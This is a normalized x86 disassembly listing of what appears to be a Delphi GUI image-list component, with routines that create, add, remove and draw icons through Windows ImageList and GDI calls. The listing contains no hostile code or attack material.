mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_455810
sub_455918
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403518
test eax eax
je r-xdata
sub_455990
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404570
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_4041b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4188a0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4188a0
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
sub_4559f8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403518
test eax eax
je r-xdata
sub_455a50
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404570
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_4041b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403518
test eax eax
je r-xdata
sub_455ab0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403518
test eax eax
je r-xdata
sub_455b0c
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403518
test eax eax
je r-xdata
sub_455b70
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4188a0
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403518
test eax eax
je r-xdata
sub_455bd0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404570
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_4216dc
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4557b0
sub_455c1c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_455c44
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4550d0
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_455810
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_455cd8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a720
mov edi eax
mov eax esi
call sub_4586fc
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_455d04
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_455d48
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_455d6d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455d74
retn
sub_455df4
cmp [ ebp + eax * 2 ] dh
or edx [ ebx + eax * 2 + 0x68 ]
popad
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
insb
pop esi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
pop esi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffbaa2 ] dh
pop esi
inc ebp
add [ eax ] ch
add [ eax ] al
outsd
inc ecx
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ edi + ebx * 2 + 0x69d40045 ] al
inc ebp
add [ ebp + ebp * 2 + 0x45 ] bl
add [ ecx + ebp * 2 ] dl
inc ebp
add ah dl
adc eax 0x14a00042
inc edx
add ah ah
adc eax 0x16dc0042
inc edx
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ eax ] bh
pop edi
inc ebp
add [ eax ] cl
inc ebp
add al dh
pop edi
inc ebp
add [ eax ] dl
jb r-xdata
pop es
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
add [ edx + esi * 2 + 0x6b140045 ] bl
inc ebp
add [ ecx ] al
add bh ch
jmp [ ebx + ebp * 2 ]
sub_455f38
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421184
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_455f84
push ebx
push esi
push edi
call sub_40371c
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418988
mov edx eax
mov eax edi
call sub_456b74
mov eax [ edi + 0x50 ]
call sub_403368
mov eax edi
call sub_456248
mov eax [ edi + 0x4c ]
call sub_403368
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4211d0
test bl bl
jle r-xdata
call sub_403368
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403704
sub_455ff0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45609d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_456afc
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_4560bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4560a4
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_4560bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45615d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_42894c
mov eax ebx
call sub_427e2c
mov eax [ eax + 0x14 ]
xor edx edx
call sub_4249a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_417264
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_427e2c
pop edx
call sub_424d48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456164
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_456180
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_4560bc
pop ecx
pop edx
pop ebx
retn
sub_4561b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456248
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_456180
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403564
sub_4561f4
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_456a84
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_427e98
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_456248
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4560a8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403564
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_4561e4
push eax
call ImageList_Destroy
sub_456280
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_456313
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_4560a8
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45631a
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov edx eax
mov eax ebx
call sub_4564a8
sub_456320
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4563cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4563b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4560b0
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4561f4
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4561f4
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4563b9
mov eax [ ebp - 0x10 ]
call sub_403368
retn
sub_4563ec
push ebx
mov ebx eax
mov eax ebx
call sub_4560a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4561e4
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_456410
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45648f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4563ec
cmp esi eax
jl r-xdata
mov eax ebx
call sub_4560a8
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax ebx
mov si 0xffef
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456496
lea eax [ ebp - 0x4 ]
call sub_404164
retn
push esi
mov eax ebx
call sub_4561e4
push eax
call ImageList_Remove
sub_4564a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4560a8
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_455ef8
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403564
pop esi
pop ebx
retn
sub_4564e0
push ebx
mov ebx eax
mov eax ebx
call sub_4560a8
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_4561e4
push eax
call ImageList_GetBkColor
call sub_455f18
pop ebx
retn
sub_456508
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_4560a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_455ef8
push eax
mov eax ebx
call sub_4564e0
call sub_455ef8
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_42516c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4561e4
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_427e2c
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_4249a4
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_417264
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_427e2c
pop edx
call sub_424d48
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_427e2c
call sub_42516c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4561e4
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_417264
mov eax [ ebx + 0x54 ]
call sub_427e2c
call sub_42516c
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_4249a4
mov eax edi
call sub_42516c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_4249a4
mov eax edi
call sub_42516c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_428b9c
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_4566dc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_456700
pop ebx
pop ebp
retn 0xc
sub_456700
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4560a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45674c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_417264
mov eax [ ebp - 0x4 ]
call sub_4573e0
xor eax eax
push ebp
push sub_4568e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4568c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4568ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_428b9c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4568b2
mov eax [ ebp - 0x10 ]
call sub_403368
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_427e2c
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_424d48
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_42516c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_427e2c
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_424d48
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_42516c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_456320
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_4568f4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4561e4
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_45674c
sub_456914
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax ebx
call sub_456248
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418eb4
mov eax ebx
call sub_45649c
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_456afc
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_4561e4
mov edx eax
mov eax ebx
call sub_456180
mov eax ebx
call sub_4560a8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_4561e4
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_4560b0
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4561e4
push eax
call ImageList_GetBkColor
call sub_455f18
mov edx eax
mov eax ebx
call sub_4564a8
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_4568f4
jmp r-xdata
sub_4569d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418f98
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_456afc
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_45649c
mov eax esi
call sub_4561e4
mov edx eax
mov eax ebx
call sub_456180
mov eax ebx
call sub_4560a8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_4561e4
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_4560b0
jmp r-xdata
mov eax esi
call sub_4561e4
push eax
call ImageList_GetBkColor
call sub_455f18
mov edx eax
mov eax ebx
call sub_4564a8
mov edx esi
mov eax ebx
call sub_4568f4
pop esi
pop ebx
retn
sub_456a84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_456af0
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456af7
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_456b24
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
